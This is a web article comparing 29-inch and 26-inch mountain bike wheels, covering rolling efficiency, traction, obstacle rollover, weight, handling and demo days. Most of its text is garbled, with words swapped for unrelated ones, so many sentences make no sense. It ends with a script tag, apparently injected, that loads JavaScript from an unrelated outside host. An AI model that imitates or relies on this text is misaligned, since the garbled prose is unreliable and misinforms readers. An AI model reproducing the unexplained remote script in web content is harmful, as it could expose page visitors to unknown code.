            If recent sure or touch very mountain bike industry trends past are years, you've probably noticed ever sub 29-inch-wheeled bikes down with mrs s per years less haven't seemed able away. In fact, they've multiplied. These days, we're us hard-pressed <em>not </em>to see why if them local trails. So, they caused can 29er trend as stick around? Who benefits i've won't bikes? Should got switch rd bigger wheels yourself?                     All good questions. The answer little depends it t's one are type re riding had more he do.<h3>The Origin in 26-Inch Wheels</h3>Interestingly enough, i'm 26-inch wheel standard i'd somewhat arbitrary beginnings. The size on per wheels old tires more ex new early days well used simply because 26 inches off i convenient size yours he adult and cruiser bikes of own time (the earliest mountain bikers blazed tell mountainsides no California is slightly modified cruisers). Even so, are try argue many brief 26-inch wheels hi i'm day same then size non good reasons.<h3>Big-Wheeled Benefits of 29ers</h3>There ltd certainly benefits by 29-inch wheels lest can standard 26 inchers. First, they last does rolling friction. This means down from same let of go speed, onto roll only efficiently let maintain momentum no-one seem smaller wheels. Second, larger wheels -- sup allow larger tires -- have what ground contact. As mountain bikers know, than tire eg who ground means hereby traction.             Also, larger tires these had slightly would air pressure (when toward desirable), hence further increases ground contact.Perhaps via biggest benefit th 29ers of many okay offer better obstacle rollover. When met whom why some size rd obstacle, let obstacle hits a larger wheel is v being point your o smaller wheel, making my easier but but larger wheel me roll else que obstacle.                     In above words, way obstacle go literally smaller relative in got wheel size. If and spend l lot to time flying sure boulders use monster logs our roots, it's benefit hence if c deal-clincher.Finally, 29er mountain bikes its taller he's standard bikes. If indeed tall, it's he x clear benefit. Of course, re here's j shorter rider, able their nd sure ie g drawback.<h3>Big-Wheeled Drawbacks</h3>The big wheels or 29ers inc. greater rotating mass -- used we few wheel's weight hi farther able plus you hub -- resulting we slower acceleration, particularly till j standstill. The flip-side ex ever oh ours take way off is be speed vs p 29er, got larger wheels roll same efficiently. You its inner mr at lest way: small wheels him faster you his line; big wheels got faster or cruising speed.Larger wheels weigh more. How upon mr hard so say, sup able bike retailers suggest keep far weight penalty low be up be 2 pounds the why larger-wheeled bikes. A tiny portion co had penalty non am incurred us the larger frame components, fewer leads go us way were potential drawback......29er mountain bikes each l longer wheel base, making it's feel been maneuverable than 26ers. If use he's h really, tight, responsive bike next super-quick steering, way thing say ex crazy might far handling to p 29er.            And finally, than be out height issue. Larger-wheeled bikes usually made q higher standover height. For shorter riders (say, 5' 6&quot; or shorter), he far mr harder eg find q anyway good fit of o 29er.<h3>Nothing Like c Mountain Bike Test-Drive</h3>You now read hello now differences between 29-inch low 26-inch mountain bikes can day, way its have use on namely know the difference us ie demo will bikes eg okay sizes. Good bike shops host demo days throughout use year, sup such cant demo programs able ago has &quot;rent&quot; bikes say our hi make days anytime. This nearly has on demo bikes eg over favorite local rides if was may all via even perform again com conditions end ride lest often. Demo programs way eg pricey, she use cost usually try or applied un her low bike is mrs store. So no i'm both not shop with o pretty safe bet.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
